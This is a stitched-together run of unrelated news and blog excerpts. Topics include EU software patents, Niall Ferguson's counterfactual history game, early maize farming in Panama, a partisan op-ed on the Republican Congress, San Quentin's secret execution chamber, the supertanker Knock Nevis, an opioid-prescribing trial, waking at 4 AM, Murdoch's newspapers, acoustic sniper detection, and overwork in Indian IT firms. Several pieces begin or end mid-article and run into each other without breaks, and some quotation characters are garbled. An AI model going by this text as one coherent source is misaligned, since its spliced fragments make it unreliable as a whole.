The Foundation for a Free Information Infrastructure ( FFII ) , which has emerged as one of the leading voices against software patents , has said that the EC 's apparent change of heart does n't go far enough .
The FFII would like to see an independent appeals process set up to deal with software patents that have already been granted .
The group believes it would make challenging patents simpler and less costly than under the current system , which requires a lawsuit to be filed with the European Court of Justice .
The FFII is also disturbed by a patent recently granted to Microsoft , saying that it shows that the EC may not yet be ready to give up the software patent fight .
In that case , the EPO said that once a program is run on a computer , it becomes a " computer - implemented method / invention " and therefore patentable .
As I 'm not an expert on European patent law or how the EC works , I can't say for sure that the issue of software patents is dead in the water .
From the EC 's statement , it is apparent that proponents of software patents have been dealt a serious blow , and that any software patent granted up to now can be challenged in court .
Whether this is the death knell for software patents in the EU remains to be seen .

What if the great events in history had turned out differently ?
How would the world today be changed ?
Niall Ferguson wonders about this a lot .
He 's a well - known economic historian at Harvard , and a champion of " counterfactual thinking , " or the re-imagining of major historical events , with the variables slightly tweaked .
In a 1999 book Virtual Histories , Ferguson edited a collection of delightfully weird counterfactual hypotheses .
One essay argued that if Mikhail Gorbachev had never existed , the USSR would still exist today .
Another posited an alternative 18th century in which Britain allows its colonies to develop their own parliaments – so the Americans never revolt , and the USA never exists .
The essays were fun , but Ferguson really craved a more holodeck - like experience .
He wanted to have a computer simulation that would let him set up historical counterfactuals – based on real - world facts – and then sit back to see what happens .
" I was always thinking that one day the right technology would come into my life , " he told me .
Last year , it finally did .
Ferguson was approached by Muzzy Lane , a game company that had created Making History – a game where players run World War II scenarios based on exhaustively researched economic realities of the period .
As he played it , he realized the game was good – so good , in fact , that it forced him to rethink some of his long - cherished theories .
For example , he'd often argued that World War II could have been prevented if Britain had confronted Germany over its invasion of Czechoslovakia in 1938 .
France would have joined with Britain , he figured , pinching Germany between their combined might and that of the Russian army .
" Germany was n't ready for war , and they would have been defeated , " he figured .
" War in 1938 would have been better than war in 1942 . "
But when he ran the simulation in Making History , everything fell to pieces .
The French defected , leaving Britain 's expeditionary force to fly solo – and get crushed by Germany .
His theory , as it turns out , did n't hold water .
He had n't realized that a 1938 attack would not leave Britain enough time to build the diplomatic case with France .
The game , in essence , helped him think more clearly about history .
" I found that my scenarios were n't as robust as I thought .
And that 's really exciting , because normally counterfactuals happen in my head , " he says .
" Now they can happen on the screen . "
Ferguson discovered something that fans of war - strategy and civilization - building " god " games have realized for years : Games are a superb vehicle for thinking deeply about complex systems .
After you 've spent months pondering the intricacies of the weapons markets in Eve Online , or the mysteries of troop placement in Company of Heroes , you develop a Mandlebrotian appreciation of chaos dynamics – how a single change can take a stable situation and sent it spiraling all to hell , or vice versa .
Though Ferguson could n't figure out how to make his 1938 scenario work , there was a better expert who could :
His 13 - year - old son , who was a whiz at strategy games .
Rather than rush out to attack Germany , his son carefully set up robust trade agreements with France first to make sure the country felt diplomatically obligated to go along with the fight .
Presto : France fought , and Germany fell .
Ferguson became so delighted with Making History that he has joined forces with Muzzy Lane to design a new game .
Due out in 2008 , this one will model modern , real - world conflicts such as Iraq , Afghanistan and the nuclear confrontation with Iran .
It 'll undoubtedly be controversial .
But it will also , he expects , be humbling .
The power of counterfactual thinking is that forces us to step outside of our comfort zones .
When we think about historical events , we have 20 /20 hindsight – so we forget how confusing and uncertain they were at the time .
In 1943 , nobody really knew how strong Germany was , or what Stalin was thinking .
In modern conflicts , we often have a similarly false sense of surety – too much confidence in our ability to predict the outcome of major events .
When we play with sims , they knock us off our pedestals – because crazy things usually happen we do n't predict .
Yet the chaos is useful , because we can run the same situation again and again , changing one little thing each time , until we 've war - gamed it deeply and understand it better than ever .
The United States used to be champions at this sort of strategic thinking , Ferguson notes , until Iraq came along .
Much of America 's failures in Iraq have been due to the overly rosy predictions of administration heads .
They did n't have the healthy respect for chaos that was the original animating genius of conservatism – the thinkers like Edmund Burke , who distrusted aggressive tinkering with economies , states or cultures , because they shuddered to think of what genies might be unleashed .
Is it possible that when today 's teenagers enter the workforce – and become tomorrow 's historians , politicians and Pentagon war fighters – that they 'll have reclaimed the ability to think counterfactually ?
Will all those years of gaming have trained them to imagine the many different ways a crisis can evolve ?
Ferguson thinks so .
" Serious games are the next big platform , " he says .
Which might be the biggest counterfactual of all .

Ancient people living in Panama were processing and eating domesticated species of plants like maize , manioc , and arrowroot at least as far back as 7,800 years ago – much earlier than previously thought – according to new research by a University of Calgary archaeologist .
One of the most hotly debated issues in the discipline of archaeology is how and why certain human societies switched from hunting and gathering to producing their own food through agriculture .
Dr. Ruth Dickau , a post - doctoral researcher in the U of C's department of archaeology , has used a new technique called starch grain analysis to recover microscopic residues of plants directly off the stone tools that people were using in Panama 3,000 to 7,800 years ago .
" These results add to the growing evidence that the earliest beginnings of farming were not centred in arid highland regions like central Mexico and the Peruvian Andes as once believed , but in the lowland areas and humid forests of the American tropics , " Dickau says .
" What is particularly interesting is that these crops were originally domesticated outside of Panama ; maize was domesticated in Mexico , and manioc and arrowroot in South America .
Panama , as a relatively narrow land - bridge between the two American continents , was an important route for the human spread of food crops , and clearly a region where agriculture was practiced very early in history . "
Dickau is the lead author of a paper appearing next week in the online early edition of the Proceedings of the National Academy of Sciences , an internationally respected academic publication .
The paper is titled " Starch Grain Evidence for the Preceramic Dispersals of Maize and Root Crops into Tropical Dry and Humid Forests of Panama . "
Dry , arid areas favour archaeological preservation , whereas tropical regions typically do n't – especially when it comes to foodstuffs .
But with starch grain analysis , researchers are able to isolate residue from microcrevices in both ground stone and flaked stone tools and identify preserved starch grains under a microscope .
" The ability of starch grain analysis to identify plant taxa in the unfavourable preservation environments of western and central Panama confirms the importance of this method for establishing the presence of particular plant species , both domesticated and wild , in the subsistence practices of early inhabitants of tropical forests , " the authors write .

Since the Democrats took control of the Congress in the recent midterm elections , we have heard and seen numerous references to the Republican victory in the 1994 midterm elections as the Republican revolution of 1994 .
What Republican revolution ?
We can see the results in history of revolutions like the American Revolution , the French Revolution , and the Russian Revolution , but what evidence is there of a Republican revolution ?
When the 104th Congress began in January of 1995 , it was the first time since the 83rd Congress of 1953 — 1955 that the Republicans had control of both the House and Senate .
They had never controlled the House during the forty - year period of Democratic rule , and only briefly controlled the Senate , during the 97th through 99th Congresses of 1981 — 1987 .
After forty years of being out of power , a revolution was certainly in order .
True , the Republicans did not yet also control the White House as they did during the 83rd Congress when Dwight Eisenhower was president , but it is Congress that writes the laws , not the president .
And unlike the Congress under Eisenhower , which reverted to Democratic rule in the next election , the Republican control of the Congress under Bill Clinton continued unabated through the end of his second term .
When what looked like a Republican revolution seemed to stagnate under Clinton , excuses began to be made for the fact that the Republicans were acting like anything but the conservatives who voted them into office .
Republican control of the White House , we were told , and a larger Republican majority in Congress , were needed to complete the revolution .
After all , Clinton could veto any bills passed by a Republican Congress , and the Republicans did not have a veto - proof majority .
It turns out that in eight years Clinton only vetoed seventeen bills , making Republican fears unfounded .
And then came George W. Bush .
Republicans were ecstatic .
A Republican president was once again elected .
This time , however , things were different .
When George Bush was inaugurated in 2001 , he had a Republican - controlled Congress .
This is something a Republican president had not had for forty - five years .
The millennium was now here .
The Republican revolution was now ready to be completed .
Enter Jim Jeffords .
The Republican controlled 107th Congress ( 2001 — 2003 ) had a weak link : the Senate .
Jeffords was a Republican senator from Vermont .
Early in Bush ’s first term , Senator Jeffords switched from Republican to Independent , changing the 50/50 balance of power in the Senate .
Although the House remained in Republican hands , those hands were tied , so we were told , because the Republicans no longer controlled the Senate .
The Republicans always seem to have an excuse .
Big government , intrusive government — it is always the fault of those evil Democrats .
But then , finally , no more excuses .
The midterm elections of 2002 gave us a new Congress ( the 108th , 2003 — 2005 ) that was once again solidly Republican .
This gave the Republicans an absolute majority for the last two years of Bush ’s first term .
This scenario was confirmed by Bush ’s reelection and the further increase of the Republican majority in the 109th Congress .
Republicans could no longer blame everything on the Democrats like they did for so long before they gained their absolute majority .
So , now that the Republicans have controlled the House since 1995 , now that the Republicans have controlled the Senate for the same period except for about a year and a half , now that a Republican president has been elected and reelected , and now that we have had several years of an absolute Republican majority , a simple question needs to be asked : What Republican revolution ?
Jacob Hornberger , the president of the Future of Freedom Foundation , recently asked some pertinent questions about the Republicans :
How many departments were abolished when Republicans controlled the presidency and both houses of Congress ?
How many agencies ?
How many spending bills were vetoed ?
How many pork - barrel projects were jettisoned ?
How much was federal spending reduced ?
The answer to every question is , of course , a big fat zero .
No egregious legislation was repealed , and the welfare / warfare state is bigger and more intrusive than ever .
Some revolution .
Although many Republicans who claim to believe in a limited government can talk a good conservatism , especially when it comes time for an election , one statistic is all it takes to see that there has been no limit to the growth of government under the Republican Party .
On the eve of the new Republican - controlled Congress in 1995 , the national debt was just under $ 5 trillion .
At the time of Bush ’s first inauguration in 2001 , the national debt stood at $ 5,727,776,738,304.64 .
At the time of his second inauguration in 2005 , the national debt stood at $ 7,613,772,338,689.34 .
On the day of the recent midterm elections , the national debt was up to $ 8,592,561,542,263.30 .
The Republican revolution is a failure , a dismal failure .
Despite the Republican rhetoric about the virtues of conservatism , the benefits of the free market , and the need for less government intervention in the economy and society , the Republican majority in both houses of Congress did nothing but further increase the size and scope of government .
This , of course , comes as no surprise , since the history of the Republican Party is not one of real conservatism at all ; it is the history of interventionism , big government , the welfare state , the warfare state , plunder , compromises , and sellouts , as Clyde Wilson and Thomas DiLorenzo have showed us in great detail .
Those who voted for a third party candidate for Congress in the recent election are not the ones who wasted their vote .
Republicans who voted for Republican candidates hoping that u201 Cthis timeu201D perhaps the performance of the Republicans might improve are the ones who wasted their vote .
Conservatives who , against their better judgment , voted Republican because they feared what would happen if the u201 Cliberalsu201D were in control , wasted their vote on a party that deserved to lose .
Evangelical Christians who held their nose and voted Republican because they thought they were choosing the lesser of two evils not only wasted their vote , but are sadly mistaken .
Do I celebrate the Democratic victory in the midterm elections for Congress ?
Hardly .
The socialist and statist policies of the Democratic Party are well known , but at least Democrats are usually honest about being advocates of bigger government and increased government intervention instead of masquerading as advocates of smaller and less intrusive government like the hypocritical Republicans do .
It is too bad that the Republicans did not at least win control of the Senate ( the Senate is now 49 Democrats , 49 Republicans , and 2 liberal Independents ) .
It is great to have gridlock between a Democratic Congress and a Republican president , but it is better to have gridlock between the House and Senate as well .
We can only hope and pray that this government comes to a grinding halt — for the sake of the liberties of the American people .

2007-04-14 04:00:00 PDT Sacramento -- Gov. Arnold Schwarzenegger 's administration has quietly built a new execution chamber at San Quentin State Prison , prompting angry lawmakers who learned about the construction just this week to accuse the governor of hiding the project from the Legislature and the public .
Prison officials began construction in January after concluding it would cost $ 399,000 -- just under the $ 400,000 that would have required legislative approval , according to an administration document obtained Friday by The Chronicle .
The new death chamber is being finished as the state 's use of capital punishment is under review by a federal court , and lawmakers have yet to authorize a larger construction project to revamp the prison 's entire Death Row .
" To sneak a project like this through is just outrageous , " said Assemblyman Jared Huffman , D - San Rafael , whose Marin County district includes San Quentin .
" We will find out what kind of creative accounting they 've done . "
Jim Tilton , Schwarzenegger 's secretary for the state Department of Corrections and Rehabilitation , said he had a good reason for not informing lawmakers -- he was unaware of the project .
In an interview late Friday afternoon , Tilton said he was aware that the corrections staff was discussing whether to build a new death chamber in response to a ruling in December by U.S. District Court Judge Jeremy Fogel that the state 's haphazard process for administering capital punishment could be considered unconstitutional .
But Tilton said he had not been told that construction had begun .
" I hate to admit it , but I do n't know everything that 's going on in the department , " he said .
" Folks ( in the department ) were n't sensitive to the history of this project .
Had I known there was a conclusion , I would have passed it on . "
Fogel ordered Schwarzenegger in December to come up with changes for executions .
Among the concerns that Fogel cited , which included the administration of the drugs used for lethal injections , was the dimly lit and cramped space the state has used as its execution chamber .
More for you News SACRAMENTO / Governor acts to save method of execution
Schwarzenegger filed a response to Fogel 's ruling in January that said he would enact changes by mid-May , although he did not say he would build a new death chamber .
A Jan. 23 memo from corrections officials to the Department of Finance described the new construction project , saying the state had been directed by the judge to create a new chamber -- an assertion that appears to be untrue .
The memo also notes that the project 's price tag would be $ 399,000 and therefore would not require legislative approval .
No one outside the administration knew about the construction until this week , when staffers with the Legislative Analyst 's Office were on a routine tour of the prison and were shown the project , which is expected to be finished by early May .
Construction workers are renovating an existing structure at the prison to use as the new execution chamber , which will include separate rooms for the condemned inmate , the media and other visitors .
The Legislative Analyst's Office -- a nonpartisan agency that provides financial advice to the Legislature -- is seeking information from the administration about the project , including how it arrived at the price tag .
State law allows departments to make minor capital improvements , such as repairs , without notifying the Legislature as long as the cost is less than $ 400,000 , according to Brian Brown , who works on corrections issues for the analyst 's office .
Assemblyman Mark Leno , D - San Francisco , called the secrecy of a project involving such a high - profile issue " insulting . "
" Why not $ 399,999.99 ? "
Leno asked facetiously .
" The question is , was this price tag a coincidence ? "
Seth Unger , media secretary for the Department of Corrections , said the department was under a tight timeline to make changes that did n't " allow the normal budget process . "
" Our facilities managers were able to construct it for that amount of money , and so we chose to go with that process , " Unger said .
He noted the department intended to inform the Legislature of the project in an upcoming quarterly report that lists all minor construction projects .
Senate President Pro Tem Don Perata , D - Oakland , said the cost was " suspicious " and said he would demand that corrections officials explain the project at a public hearing .
Perata noted that two of his aides were at San Quentin earlier this month and were not shown the new building .
He said the revelation about a new death chamber could slow negotiations between the governor and lawmakers on other prison issues .
" He is asking us for the authority to build $ 10 billion in new prison beds , " Perata said about the governor 's proposal to address prison overcrowding .
" But if we can't trust them on something like this , why should we trust them at all ? "
Huffman said he was particularly angry because he recently held a meeting with Tilton about a proposal to rebuild the Death Row at San Quentin , and Tilton did not mention the new execution chamber .
Tilton said Friday that he had not been aware during his meeting with Huffman that a new chamber was being built .
The Schwarzenegger administration has proposed a $ 337 million project that would build new cells for Death Row inmates , who are living in old , cramped quarters .
The project has been proposed for years and met with opposition in Marin County , where some local officials have called for closing the 155 - year - old prison .
The new Death Row proposal is 53 percent more expensive than one proposed in 2003 , and a recent report by the Legislative Analyst 's Office recommended that lawmakers reject the project .
" Why on earth would you spend hundreds of thousands of dollars on something when the whole Death Row project is in question and we 're not sure our form of capital punishment will meet constitutional muster ? "
Huffman said .
The new chamber was built next to the famed lime - green structure that was a gas chamber until the state began using lethal injection in 1996 .
Condemned inmates legally may choose whether to be executed by gas or lethal injection .
Tilton said the new building was not set up as a gas chamber and that the department would keep the old structure .
While administration officials said in the memo initiating the project that they had been directed by the court to create a new execution chamber , there is no court order suggesting they do so .
Fogel asked the administration to come up with proposed solutions , which he plans to review after they are submitted in May .
An attorney for Michael Morales , the Death Row inmate who sued the state over its use of lethal injection , said he was not aware of the administration 's project and did not believe the governor had notified the court that it was building a new chamber .
The attorney , David Senior , noted that Schwarzenegger had requested an unusual court order that would have allowed the administration to keep its deliberations about revamping death penalty procedures under seal , which would have made it more difficult for defense lawyers or the media to obtain any documents related to the issue .
The Chronicle and other news organizations argued against the court order , and Fogel agreed with them in a February ruling .
" The failure to disclose what they 're doing and how they 're doing it ( at San Quentin ) meets squarely with their refusal to provide transparency throughout this process , " Senior said .

4. Supertanker Knock Nevis / Jahre Viking - big ship with a big story
( Photo collection Dag Bjerke , via Supertankers )
This is the king of all supertankers , and possibly the biggest ship ever constructed ( see French tankers on page 1 , competing for this title ) .
However , it is certainly the BIGGEST SHIP still in operation ( albeit as a " floating storage and offloading unit " only ) .
There is also a larger - than - life story associated with that ship .
First of all , it had more pseudonyms than Alexandre Dumas :
- " Seawise Giant "
- " Porthos "
- " Happy Giant "
- " Jahre Viking "
- " Knock Nevis "
Built in Japan in 1979 for a Greek shipping magnate , who went bankrupt shortly thereafter , she was sold to the Hong Kong owner , who promptly increased her length even more .
In 1981 " The Seawise Giant " was born , biggest among ships .
To give you some idea of her size , compare with London 's Tower Bridge :
... with Empire State Building and Eiffel Tower :
At first , she operated between the Middle East and the USA but from about 1986 she was used as a floating storage ship and transhipment terminal in Iran during the Iran - Iraq War .
In May , 1988 , the ship was attacked and heavily damaged by bombs dropped from Iraqi jets while lying at the Iranian Hormuz terminal in the Strait of Hormuz .
Check out the fire and damage photos here .
Extensively damaged , she sank in the shallow waters there .
But the story does not end here .
Miraculously , she gained a second life and a full restoration !
" The Sea Wise Giant " , or what remained of her , was bought by a Norwegian company , re-floated , and towed to the Keppel shipyard in Singapore .
After major conversions and repairs she was relaunched in 1991 first as the " Happy Giant " , and then as the " TT Jahre Viking " .
Here is a photo of restoration ( click to enlarge ) :
In March 2004 , the ship was sold again and sent by her new owner to the Dubai shipyard to be refitted as a floating storage and offloading unit ( FSO ) .
There , she was given her current name , " Knock Nevis " .
On the following photos we see her arrival at the docks - the final sea voyage of the great and legendary ship :

It was the kind of letter Dr. Hurwitz received from people across the country .
His office in the Virginia suburbs of Washington was like a Lourdes for people with pain , one of the most widespread health problems .
Surveys have found that one in five adults deals with chronic pain , and that it is treated adequately only about half the time .

Prescribing opioids was once taboo because of concerns over patients ’ becoming addicted .
But medical opinion gradually shifted over the past two decades as researchers concluded that high doses of opioids could sometimes be safer and more effective than alternatives like surgery or injections .
Two of the leading pain experts , Dr. Russell K. Portenoy of Beth - Israel Medical Center and Dr. James N. Campbell of Johns Hopkins University , testified without pay as experts for the defense .
They said Dr. Hurwitz was widely known as a knowledgeable physician and passionate advocate of giving patients full pain relief , unlike many doctors who were reluctant to prescribe opioids because they feared legal repercussions , particularly when dealing with patients who sometimes used illegal drugs .
Such “ problem patients ” consumed so much time and energy that most doctors refused to treat them “ regardless of what the consequences would be for the patient , ” Dr. Campbell testified .
He said that he had been initially skeptical of some of Dr. Hurwitz ’s high - dose treatments , but was then impressed by the results in patients he sent to Dr. Hurwitz .
He said some doctors might argue that Dr. Hurwitz was guilty in some instances of negligence that would make him liable for damages in a civil case .
But Dr. Campbell contradicted the prosecution ’s experts by testifying that all the prescriptions were clearly within the “ bounds of medical practice . ”
That legal phrase is the crucial distinction in this criminal case , which the jury was deliberating as this column went to press : Did Dr. Hurwitz knowingly prescribe drugs to be used for nonmedical purposes ?
( For updates on the case , see www.nytimes.com/tierneylab.)
On Dumb Little Man I have mentioned ( several times ) that I am generally awake each morning at 4AM .
While that time may seem inconceivable to most of you , the simple idea of at least waking up earlier in general should be easy to swallow .
From 4 - 6 AM , I simply get a ton of things done .
In fact , I ’d argue that I get more done from 4 - 6 AM than I do from 8 - Noon .
No matter what I decide to do , it ’s uninterrupted simply because no one else is awake and functioning .
It ’s purely a time for knocking out tasks ( work or home related ) , reading , project work , planning , etc .
It ’s great .
My life was not always this way , I used to be the guy that stayed up late and woke up with barely enough time to shower before work .
So , how did I change that ?
It ’s actually pretty simple , I installed a regimen that I have now followed for years .
On average , I believe that I have given myself an extra 5 hours per week or ( do the math ) an extra 10.8 days per year to get stuff done .
Lying in bed is not sleeping : 10:00 PM was my previous bedtime .
Frankly , I chose that time because that ’s when my parents went to bed when I was a kid .
I had no real reason for it .
What I found was that I would watch the news and then end up lying in bed for an hour pondering and stressing .
In my belief , the key to extending your days is to lie down when you simply cannot ponder any longer .
If you are drifting off at the computer , while reading , or watching TV , it ’s time to get to bed .
Your bedtime should and will vary from night to night .
Let your body tell you when to sleep as opposed to the following the 8 - hour rule .
Really , how good is that rule if you a laying in bed awake for an hour ?
Rise and Shine :
No matter what time you to go to bed – you ’re alarm should go off each morning at the same time , 7 days per week .
When I started this self - programming , I chose 4AM and today , regardless of the time I hit the rack , I am up at 4 AM without an alarm .
I have gone to bed at 2:30 AM on occasion and still gotten up automatically at 4:00 feeling good .
Sleepy at Noon ? :
We ’ve all heard the some countries encourage lunchtime naps .
Well , me too .
For lunch , I eat a sandwich and when possible ( and only when I feel tired , this is not daily ) I take a power nap that lasts all of 20 minutes .
Instead of sitting at my desk for lunch , I will hop in the car and head to a forest preserve , behind a strip mall , etc .
I eat , and then turn the radio down for a quick nap ( set your cell phone alarm ) .
I wake up totally refreshed .
It ’s actually kind of eerie because the energy I have after this little midday nap easily trumps the energy I had in the morning .
These 3 simple things have created a self - adjusting alarm clock inside my body .
Since I wake up at the exact same time each day , my body knows how to adjust .
In the evening , it will ( through drifting off ) tell me to go to bed earlier if in fact I am tired .
On the flip side , if my body has the energy , I can write on this site or do whatever until 1 AM if I want .
This is essentially due to a hormone release that happens internally .
I am programmed to be drowsy when I need to be and productive when I do n’t .
Think about what you could do with this added 5 hours per week .
I am not implying that you have to be up at 4AM , but if in fact you find yourself “ trying ” to fall asleep or watching TV for hours at night , this may be something for you to try .

In his memoir , “ Good Times , Bad Times , ” Mr. Evans wrote that Mr. Murdoch did not suggest specific editorial views .
Rather , he made his feelings known “ by jabbing a finger at headlines which he thought could have been more supportive of Mrs. Thatcher . ”
In 1983 , Mr. Murdoch caused a stir when he personally secured the publishing rights to what were said to be Hitler ’s diaries , only to learn subsequently that they were fakes after publishing them in The Sunday Times .
“ I think he ’s learned quite a lot of lessons from The Times and The Sunday Times , ” said Andrew F. Neil , a former editor of the latter paper for Mr. Murdoch , who is now a television interviewer and magazine executive in Britain .
“ He gives his quality newspaper editors a freer hand , ” Mr. Neil said .
“ He ’s much more hands - on with his tabloids .
If you want to know what Rupert ’s thinking , read The Post . ”
Indeed , Mr. Murdoch said in an interview last week that he spoke with Col Allan , The Post ’s editor , nearly every day .
If Mr. Thomson — a former veteran of The Financial Times — is any indication , Mr. Murdoch is more inclined to gossip about world affairs , politics and business .
And under Mr. Murdoch , Mr. Thomson has made considerable investments in The Times including transforming it from a broadsheet into a tabloid format ( known as a “ compact ” among those who dislike the term “ tabloid ” ) and to expand foreign bureaus significantly .
Mr. Murdoch , who sought a meeting with the Bancroft family , has not made any of his specific plans for the company public .
But he is expected to take a similar expansive approach to the much - larger Journal , which he covets as much for its online operation WSJ.com as for the print edition .
( In Dow Jones , Mr. Murdoch would also be buying a major news service , Barron ’s , MarketWatch.com , half of SmartMoney magazine and other assets . )
Should he ultimately succeed , one thing people who follow or have worked with him say to expect is a wrenching look at the newspaper ’s costs , coupled with an ambitious long - term plan to revitalize and expand The Journal ’s international operations and integrate them with other News Corporation Web sites around the world .
With The Times in London , as well as The New York Post , Mr. Murdoch has also shown that he will tolerate losses , sometimes for years .
He relies on the fact that newspapers account for only 14 percent of his company ’s more than $ 26 billion in annual revenues .
The company ’s bigger and often more profitable businesses include the 20th Century Fox film and TV studio , the Fox TV network and cable channels , and the BSkyB satellite service in Britain .
For soldiers on patrol in Iraq , sniper attacks can seemingly come out of nowhere and leave little chance for return fire .
But with new anti-sniper detection systems proving their worth for U.S. soldiers and marines in Iraq since 2004 , warriors can now return fire more effectively to defend themselves – and a Montana researcher is independently studying those systems to better understand how they work .
The sniper detection systems in use by the U.S. military follow the supersonic trail of a bullet back to the gunman .
“ If you imagine a slow motion view of this , the bullet is racing ahead and the shockwave expands out like a cone behind the moving bullet , ” said Rob Maher , an Associate Professor of Electrical and Computer Engineering at Montana State University .
Snipers and gunmen usually use rifles , such as the AK - 47 assault rifle and its variants , which fire bullets faster than the speed of sound .
When the gun is fired , the bullet ’s supersonic passage creates a shockwave of air particles that are being pushed aside .
This is different from the actual muzzle blast of the gun , which produces the sound that people hear as gunshots .
“ There are commercial systems that have been deployed there [ in Iraq ] that are able to alert soldiers to where incoming bullets are coming from , ” noted Maher .
Many of those systems , which are mounted on buildings or vehicles occupied by soldiers , try to pinpoint snipers by detecting both the shockwave of the bullet ’s passage and the sound of the gunshot .
Maher ’s current research involves testing different guns , mostly rifles , which are set up at a firing range .
Two or more microphones are organized in a known configuration on the range , and hooked up to a digital audio recorder that records supersonic shockwave .
As the gun is fired and the bullet ’s shockwave expands outward , a computer program records the different times at which the shockwave arrives at each microphone .
Based on the difference in arrival times and other consistent factors , the computer can calculate the angle from which the bullet came .
This way Maher can test different guns and bullets by firing them from different angles with respect to the microphones .
The process of identifying the location of a fired shot is further compounded when microphones pick up background noise in addition to the bullet shockwave and the sound of the gunshot .
Heavy background noises , such as would happen if a sniper fired on a patrol in the middle of a bustling marketplace , are likely to be the case in real - life situations .
“ The biggest difficulty with any of this is dealing with the natural sound environment , ” said Maher .
Current computer programs have a hard time distinguishing specific sounds from the background noise , he explained .
By contrast , humans are able to listen to competing sounds and quickly focus on one particular thing , something everyone has done while focusing on one conversation in the middle of a loud party .
One system that seems to have been able to overcome this challenge is Boomerang , a system developed by BBN Technologies and the Defense Advanced Research Projects Agency , or DARPA .
“ For the system to work on the move in an urban setting is incredibly challenging , ” said Karen Wood , the DARPA program manager who oversaw development of Boomerang .
She explained that the system has to work while mounted on an extremely noisy , moving platform – such as a Humvee – all the while ignoring the outgoing fire of U.S. soldiers and marines .
The system also has to deal with other complicating factors in urban environments , such as the sounds of gunshots reflecting off of buildings , cars , and even garbage .
“ When I first got involved in project , a lot of people were saying that it [ reflections of acoustic signatures ] was not a solvable problem … but BBN had some very clever engineers and algorithm folk who did solve it , ” said Wood .
However , Maher noted that the research behind a commercial system such as the Boomerang is “ proprietary and done without open publication ” by private companies .
This means that very little information on the commercial systems is available to university researchers working in the same area .
“ My assumption is that [ system designers ] basically make a lot of educated assumptions and guesses on what is likely to be the case [ in the field ] , and if those are valid then the systems probably work quite well , ” said Maher .
Given the lack of public information available on the systems , part of Maher ’s goal is to share his research results with the wider scientific community , allowing private and public researchers to improve their own work on existing acoustic technologies , such as anti-sniper detection systems .
Maher only recently became involved in studying gunshots and the acoustics of bullets , after law enforcement officials independently asked him to look into the area .
He has since presented his work at the annual meeting of the Institute of Electrical and Electronics Engineers , and is discussing future funding with several possible sources such as the Department of Defense .
Maher is also looking beyond anti-sniper detection systems , and sees his current work as crucial for the field of acoustics research .
Law enforcement could possibly identify guns based on sound signatures of gunshots in 9 - 1 - 1 calls , or the National Parks Service could better monitor park and nature areas by studying trends in animal sounds , such as bird calls .
Park services could also screen for the sound of unwanted human activity .
“ The reason gunshots are important is that gunshots have specific impulsive quality , ” explained Maher .
“ If we ca n’t write computer software that can recognize gunshots , it ’s unlikely that less distinctive types of sounds can be recognized . ”
Admittedly , acoustics research has a ways to go before computers can accurately pick out the faintest sounds , but Maher pointed out that current anti-sniper detection systems are already putting the ideas to practical use in a way that cannot be underestimated .
“ If I was a soldier and there was any system that would even give me a glimmer of hope of protecting myself , I would use it , ” said Maher .
That ’s the same attitude Wood , of BBN Technologies , used when she approached the development of Boomerang .
After the war started , Rumsfeld approached DARPA and asked for near - term solutions that could be applied to the conflict in Iraq .
The former Secretary of Defense was looking for something that did n’t have to be a perfect solution , but was at least better than nothing .
Following additional testing and incorporating feedback from soldiers and marines , BBN Technologies has turned out a third version of Boomerang .
The company advertises its product as having just one false alarm per 1000 hours of use – good enough for the U.S. military , which already has over 100 units deployed and has ordered an additional 100 units .
“ We get e-mails all the time from people who say thank you for developing the system , ” said Wood .
IT Survivors – Staying Alive In A Software Job
Written by Harshad Oak
Tursday , 03 November 2005
Before I started working for myself , I spent some years in some of
the top IT companies in India and still have many friends working in
various software companies .
I wrote a blog Recruiting like crazy , about
the same time last year about how Indian companies are recruiting
like there ’s no tomorrow and the possible consequences .
However I was
avoiding writing this particular piece as it seems like an unpatriotic
thing to do , to tell the world how bad the working conditions in
software companies in India have become .
And there ’s always the risk of
excerpts being used out of context to bash up IT in India .
I am now writing this because I just keep hearing horror tales from
the industry and it does n’t seem like anything is being done in the
matter , so I thought I will do my bit and write .
First and foremost , before stereotypes about India kick in , I would
like to clarify that I am not saying that Indian software companies
are sweat shops where employees are n’t being paid and made to work in
cramped uncomfortable places .
The pay in software companies is very
good as compared to other industries in India and the work places are
generally well furnished and plush offices .
India being a strong
democracy , freedom of __expression is alive and well and Indians are free
to express their opinions and voice their concerns .
Yet , I say that
the software industry is exploiting its employees .
IT work culture in India is totally messed up and has now started
harming the work culture of the nation as a whole .
Working 12 + hours a
day and 6 or even 7 days a week is more the rule than the exception .
Consequences :
· A majority of IT people suffer from health problems .
As most of the
IT workforce is still very young , the problem is n’t very obvious
today but it will hit with unbearable ferocity when these youngsters get
to their 40s .
· Stress levels are unbelievable high .
Stress management is a cover
topic in magazines and newspapers and workshops on the subject are
regularly overbooked .
· Most IT people have hardly any social / family life to talk of .
· As IT folk are rich by Indian standards , they try to buy their way
out of their troubles and have incurred huge debts by buying
expensive houses , gizmos and fancy cars .
Plush offices , fat salaries and latest gizmos can give you happiness
only if you have a life in the first place .
The reason I feel this culture has emerged , is the servile attitude
of the companies .
Here ’s a tip for any company in the west planning to
outsource to India .
If you feel that a project can be completed in 6
weeks by 4 people , always demand that it be completed in 2 weeks by 3
people .
Guess what , most Indian companies will agree .
The project will then
be hyped up as an “ extremely critical ” one and the 3 unfortunate souls
allocated to it will get very close to meeting the almighty by the
time they deliver the project in 2 weeks .
Surprisingly , they will
deliver in 2 - 3 weeks , get bashed up for any delays and the company will
soon boast about how they deliver good quality in reasonable time and
cost .
Has anyone in India ever worked on a project that was n’t
“ extremely critical ” ?
I was once at a session where a top boss of one of India ’s biggest IT
firms was asked a question about what was so special about their
company and his answer was that we are the “ Yes ” people with the “ We Can
Do It ” attitude .
It is all very well for the top boss to say “ We Can
Do It “ .. what about the project teams who wish to say “ Please … .
We
Ca n’t Do
It ” to the unreasonable timelines … I was tempted to ask
“ What death benefits does your company offer to the teams that get
killed in the process ? ” .
I sure was ashamed to see that a fellow Indian
was openly boasting about the fact that he and his company had no
backbone .
The art of saying
No or negotiating reasonable time frames for
the team is very conspicuous by its absence .
Outsourcing customers
more often than not simply walk all over Indian software companies .
The
outsourcer surely cannot be blamed as it is right for him to demand
good quality in the least cost and time .
Exhaustion = Zero Innovation
· How many Indians in India are thought leaders in their software
segment ?
– Very few
· How much software innovation happens in India ?
– Minimal
· Considering that thousands of Indians in India use Open Source
software , how many actually contribute ?
– Very few
Surprisingly , put the same Indian in a company “ in ” the US and he
suddenly becomes innovative and a thought leader in his field .
The
reason is simple , the only thing an exhausted body and mind can do well ,
is sleep .
zzzzzz
I can pretty much bet on it that we will never see innovation from
any of 10000 + person code factories in India .
If you are someone sitting in the US , UK … and wondering why the
